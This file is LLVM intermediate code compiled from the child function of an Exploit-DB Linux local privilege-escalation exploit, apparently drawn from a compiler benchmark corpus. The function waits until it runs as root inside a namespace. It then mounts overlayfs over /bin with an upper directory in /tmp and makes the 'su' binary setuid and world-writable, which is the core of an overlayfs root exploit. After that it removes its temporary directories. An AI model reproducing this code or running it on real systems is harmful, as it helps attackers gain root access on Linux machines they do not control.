; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39230.c_childFunc.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39230.c_childFunc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"euid: %d, egid: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"overlayfs\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"/tmp/x/bin\00", align 1
@MS_MGC_VAL = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [54 x i8] c"lowerdir=/bin,upperdir=/tmp/x/over,workdir=/tmp/x/bin\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"Overlay mounting failed: %d (%s)\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [3 x i8] c"su\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"Mode change failed\0A\00", align 1
@.str.7 = private unnamed_addr constant [54 x i8] c"Namespace helper waiting for modification completion\0A\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"/proc/%d\00", align 1
@.str.9 = private unnamed_addr constant [38 x i8] c"Namespacer helper: parent terminated\0A\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"/tmp/x/over/su\00", align 1
@.str.12 = private unnamed_addr constant [12 x i8] c"/tmp/x/over\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/tmp/x/bin/work\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"/tmp/x/\00", align 1
@.str.15 = private unnamed_addr constant [26 x i8] c"Namespace part completed\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @childFunc to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @childFunc(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.stat, align 8
  %6 = alloca [128 x i8], align 16
  store i8* %0, i8** %3, align 8
  %7 = load i32, i32* @stderr, align 4
  %8 = call i32 (...) @geteuid()
  %9 = call i32 (...) @getegid()
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %7, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 %8, i32 %9)
  br label %11

11:                                               ; preds = %14, %1
  %12 = call i32 (...) @geteuid()
  %13 = icmp ne i32 %12, 0
  br i1 %13, label %14, label %16

14:                                               ; preds = %11
  %15 = call i32 @usleep(i32 100)
  br label %11

16:                                               ; preds = %11
  %17 = load i32, i32* @stderr, align 4
  %18 = call i32 (...) @geteuid()
  %19 = call i32 (...) @getegid()
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 %18, i32 %19)
  %21 = load i32, i32* @MS_MGC_VAL, align 4
  %22 = call i32 @mount(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %21, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  store i32 %22, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %31

25:                                               ; preds = %16
  %26 = load i32, i32* @stderr, align 4
  %27 = load i32, i32* @errno, align 4
  %28 = load i32, i32* @errno, align 4
  %29 = call i8* @strerror(i32 %28)
  %30 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i32 %27, i8* %29)
  store i32 1, i32* %2, align 4
  br label %70

31:                                               ; preds = %16
  %32 = call i32 @chdir(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 @chmod(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2559)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %39

36:                                               ; preds = %31
  %37 = load i32, i32* @stderr, align 4
  %38 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %2, align 4
  br label %70

39:                                               ; preds = %31
  %40 = load i32, i32* @stderr, align 4
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %40, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.7, i64 0, i64 0))
  %42 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %43 = call i32 (...) @getppid()
  %44 = call i32 @sprintf(i8* %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0), i32 %43)
  br label %45

45:                                               ; preds = %39, %59
  %46 = call i32 @usleep(i32 100)
  %47 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %48 = call i32 @stat(i8* %47, %struct.stat* %5)
  store i32 %48, i32* %4, align 4
  %49 = load i32, i32* %4, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %54

51:                                               ; preds = %45
  %52 = load i32, i32* @stderr, align 4
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.9, i64 0, i64 0))
  br label %60

54:                                               ; preds = %45
  %55 = getelementptr inbounds %struct.stat, %struct.stat* %5, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %54
  br label %60

59:                                               ; preds = %54
  br label %45

60:                                               ; preds = %58, %51
  %61 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  %62 = call i32 @umount(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %63 = call i32 @unlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0))
  %64 = call i32 @rmdir(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i64 0, i64 0))
  %65 = call i32 @rmdir(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i64 0, i64 0))
  %66 = call i32 @rmdir(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %67 = call i32 @rmdir(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %68 = load i32, i32* @stderr, align 4
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %68, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.15, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %70

70:                                               ; preds = %60, %36, %25
  %71 = load i32, i32* %2, align 4
  ret i32 %71
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @geteuid(...) #1

declare dso_local i32 @getegid(...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @mount(i8*, i8*, i8*, i32, i8*) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @getppid(...) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @umount(i8*) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @rmdir(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
